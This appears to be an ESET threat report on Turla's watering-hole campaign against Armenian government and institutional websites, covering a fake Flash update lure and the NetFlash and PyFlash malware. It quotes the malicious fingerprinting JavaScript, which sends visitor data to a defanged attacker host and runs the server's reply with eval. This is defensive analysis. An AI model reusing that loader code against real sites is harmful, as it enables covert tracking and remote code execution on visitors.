It relies on a fake Adobe Flash update lure and delivers\ntwo previously undocumented pieces of malware we have dubbed NetFlash and PyFlash.\n\nVarious aspects of this campaign lead us to attribute this operation to Turla, an infamous\nespionage group active for more than ten years. Its main targets include governmental and\nmilitary organizations. We have previously reported multiple campaigns of this group including\n[Mosquito and LightNeuron.](https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf)\n\nThis recent operation bears similarities to several of Turla’s watering hole campaigns that we\n[have tracked in the past years. In particular, the modus operandi is similar to a campaign we](https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/)\nuncovered in 2017. The various pieces of JavaScript used there are almost identical to those in\nthis campaign, but the targets and payloads are different.\n\n## Targeted websites\n\nIn this specific operation, Turla has compromised at least four Armenian websites, including two\nbelonging to the government. Thus, it is likely the targets include government officials and\npoliticians.\n\nAccording to ESET telemetry, the following websites were compromised:\n\narmconsul[.]ru: The consular Section of the Embassy of Armenia in Russia\nmnp.nkr[.]am: Ministry of Nature Protection and Natural Resources of the Republic of\nArtsakh\naiisa[.]am: The Armenian Institute of International and Security Affairs\nadgf[.]am: The Armenian Deposit Guarantee Fund\n\nWe have indications that these websites were compromised since at least the beginning of 2019.\nWe notified the Armenian national CERT and shared our analysis with them before publication.\n\nTurla operators leveraged unknown access methods to these websites to insert a piece of\nmalicious JavaScript code. For example, for mnp.nkr[.]am, they appended obfuscated code at the\nend of jquery-migrate.min.js (a common JavaScript library), as shown in Figure 1.\n\n\n-----\n\n_Figure 1. Obfuscated JavaScript code injected into the mnp.nkr[.]am website_\n\nThis code loads an external JavaScript from skategirlchina[.]com/wpincludes/data_from_db_top.php. We analyze this code in the next section.\n\nSince the end of November 2019, we noticed that skategirlchina[.]com was not delivering\nmalicious scripts anymore. Thus, it is likely the Turla operators have suspended this watering hole\noperation.\n\n## Fingerprinting and malware delivery\n\nUpon visiting a compromised webpage, the second-stage malicious JavaScript is delivered by\nskategirlchina[.]com and fingerprints the visitor’s browser. Figure 2 shows the main function of this\nscript.\n\n[If it is the first time the user’s browser executes the script, it will add an evercookie with a](https://en.wikipedia.org/wiki/Evercookie)\nseemingly random MD5 value provided by the server, different at each execution of the script.\n[The implementation of the evercookie is based on code available on GitHub. It uses multiple](https://github.com/samyk/evercookie)\nstorage places such as the local database, local shared objects (Flash cookies), Silverlight\nstorage, etc., to store the cookie value. In comparison to a regular cookie, it will be much more\npersistent as it won’t be deleted if the user just deletes the browser’s cookies.\n\nThis evercookie will be used to track whether the user visits one of the compromised websites\nagain. When the user comes back for a second time, the previously stored MD5 value will be\nused to identify them.\n\nThen, it collects several pieces of information including the browser plugin list, the screen\nresolution and various operating system information. This is sent to the C&C server in a POST\nrequest. If there is a reply, it is assumed to be JavaScript code and is executed using the eval\nfunction.\n\n\n##### 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n\n\n##### […]\n\n function f_ec(){\n\n   var ec = new evercookie({domain:'http://skategirlchina[.]com/wp- includes/data_from_db_top.php',baseurl:'?http://skategirlchina[.]com/wp- includes/data_from_db_top.php'});\n\n   ec.get(\"ec\", function(value) {\n\n\n-----\n\n##### 6\n\n 7\n\n 8\n\n 9\n\n 10\n\n 11\n\n 12\n\n 13\n\n 14\n\n 15\n\n 16\n\n 17\n\n 18\n\n 19\n\n 20\n\n 21\n\n 22\n\n 23\n\n 24\n\n 25\n\n 26\n\n 27\n\n 28\n\n 29\n\n 30\n\n 31\n\n 32\n\n 33\n\n 34\n\n\n#####     if (value!=undefined){\n\n       var jsonText = {'ec': ''+value+'',\n\n               'scp':screen.pixelDepth==undefined?''+0+'':''+screen.pixelDepth+ '',\n\n               'scw':''+screen.width+'',\n\n               'sch':''+screen.height+'',\n\n               'bn':''+bn+'',\n\n               'bv':''+bv+'',\n\n               'bc':''+bc+'',\n\n               'osn':''+osn+'',\n\n               'osv':''+osv+'',\n\n               'osc':''+osc+'',\n\n               'adr':''+adr+'',\n\n               'pdr':''+pdr+'',\n\n               'fla':''+fla+'',\n\n               'jav':''+jav+'',\n\n               'wmp':''+wmp+'',\n\n               'msw':''+msw+'',\n\n               'qui':''+qui+'',\n\n               'sho':''+sho+'',\n\n               'type':'info',\n\n               'tiz': ''+(new Date().getTimezoneOffset()/60)+''\n\n               };\n\n         var json = JSON.stringify(jsonText);\n\n         ajax({\n\n         content_type : 'application/json',\n\n         url: 'http://skategirlchina[.]com/wp-includes/data_from_db_top.php? http://skategirlchina[.]com/wp-includes/data_from_db_top.php',\n\n         crossDomain: true,\n\n         type: 'POST',\n\n\n-----\n\n##### 35\n\n 36\n\n 37\n\n 38\n\n 39\n\n 40\n\n 41\n\n 42\n\n 43\n\n\n#####         data: json,\n\n         onSuccess: function(m){\n\n           eval(m);\n\n         }\n\n       });\n\n     }\n\n     else{\n\n      ec.set('ec', '<redacted MD5 value>');\n\n      setTimeout(f_ec,1500);\n\n     }\n\n\n_Figure 2. Fingerprint script (malicious URLs defanged)_\n\nIf the visitor is deemed interesting, the server replies with a piece of JavaScript code that creates\nan iframe. Data from ESET telemetry suggests that, for this campaign, only a very limited number\nof visitors were considered interesting by Turla’s operators.\n\nThis iframe displays a fake Adobe Flash update warning to the user, shown in Figure 3, in order\nto trick them into downloading a malicious Flash installer.\n\n_Figure 3. Fake Adobe Flash update iframe_\n\n\n-----\n\nWe did not observe the use of any browser vulnerabilities. The compromise attempt relies only on\nthis social engineering trick. Once the malicious executable is downloaded from the same server\nas the iframe’s JavaScript, and if the user launches it manually, a Turla malware variant and a\nlegitimate Adobe Flash program are installed.\n\nFigure 4 is an overview of the compromise process from initially visiting one of the compromised\nArmenian websites to the delivery of a malicious payload.\n\n\n-----\n\n_Figure 4. Overview of the watering hole operation_\n\n## Malware\n\nOnce the user executes the fake installer, it will execute both a Turla malware variant and a\nlegitimate Adobe Flash installer. Thus, the user is likely to believe that the update warning was\nlegitimate.\n\n### Before September 2019: Skipper\n\nPrior to the end of August 2019, the victim would receive a RAR-SFX archive containing a\nlegitimate Adobe Flash v14 installer and a second RAR-SFX archive. The latter contains the\nvarious components of a backdoor known as Skipper that has been previously attributed to Turla.\n[It was documented in 2017 by researchers from Bitdefender, and a more recent version was](https://labs.bitdefender.com/wp-content/uploads/downloads/new-pacifier-apt-components-point-to-russian-linked-turla-group/)\n[documented by Telsy in May 2019.](https://blog.telsy.com/following-the-turlas-skipper-over-the-ocean-of-cyber-operations/)\n\nGiven that there are only minor changes between the documented versions and the most recent\nones, we won’t provide a detailed analysis here.\n\nOne interesting change is that the Skipper communication module uses the server that hosts this\ncampaign’s remote JavaScripts and malicious binaries for its C&C server, specifically\nskategirlchina[.]com/wp-includes/ms-locale.php.\n\n### From September 2019: NetFlash and PyFlash\n\nAt the end of August 2019, we noticed that the payload delivered by skategirlchina[.]com\nchanged.\n\n#### NetFlash (.NET downloader)\n\nThe new payload was a .NET application that dropped an installer for Adobe Flash v32 in\n%TEMP%\\adobe.exe, and NetFlash (a .NET downloader) in %TEMP%\\winhost.exe.\n\nAccording to their compilation timestamps, the malware samples were compiled at the end of\nAugust 2019 and at the beginning on September 2019, right before being uploaded to the\nwatering hole’s C&C server.\n\nNetFlash downloads its second stage malware from a hardcoded URL and establishes\npersistence for this new backdoor using a Windows scheduled task. Figure 5 shows the NetFlash\nfunction that downloads the second stage malware, named PyFlash. We also encountered\nanother NetFlash sample, likely compiled at the end of August 2019, with a different hardcoded\nC&C server: 134.209.222[.]206:15363.\n\n\n-----\n\n_Figure 5. Main function of NetFlash_\n\n#### PyFlash\n\nThis second stage backdoor is a py2exe executable. py2exe is a Python extension to convert a\nPython script into a standalone Windows executable. To our knowledge, this is the first time the\nTurla developers have used the Python language in a backdoor.\n\nThe backdoor communicates with its hardcoded C&C server via HTTP. The C&C URL and other\nparameters such as the AES key and IV used to encrypt all network communications are\nspecified at the beginning of the script, as shown in Figure 6.\n\n_Figure 6. Global variables in the PyFlash Python script_\n\nThe main function of the script, shown in Figure 7, sends information about the machine to the\nC&C server. This is the output of the functions from the commands list seen in Figure 6. It\nincludes OS-related commands (systeminfo, tasklist) and network-related commands (ipconfig,\ngetmac, arp).\n\n\n-----\n\n_Figure 7. Main function of PyFlash_\n\nThe C&C server can also send backdoor commands in JSON format. The commands\nimplemented in this version of PyFlash are:\n\nDownload additional files from a given HTTP(S) link.\nExecute a Windows command using the Python function subprocess32.Popen.\nChange the execution delay: modifies the Windows task that regularly (every X minutes; 5\nby default) launches the malware.\nKill (uninstall) the malware. To confirm this instruction the malware sends a POST request\nto the C&C server with the following string:\n\n_I’m dying :(_\n_Tell my wife that i love her…_\n\nThen, the output of the command is sent back to the operators, encrypted with AES, via a POST\nrequest.\n\n## Conclusion\n\nTurla is still using watering hole attacks as one of its initial access tactics. Interestingly, this\ncampaign relies on a well-known social engineering trick – a fake Adobe Flash update warning –\nin order to induce the user to download and install malware.\n\nOn the other hand, the payload has changed, probably in order to evade detection, as Skipper\nhas been known for many years. They switched to NetFlash, which installs a backdoor we call\nPyFlash and that is developed in the Python language.\n\n_We will continue monitoring new Turla activities and will publish relevant information on our blog._\n_[For any inquiries, contact us as threatintel@eset.com.
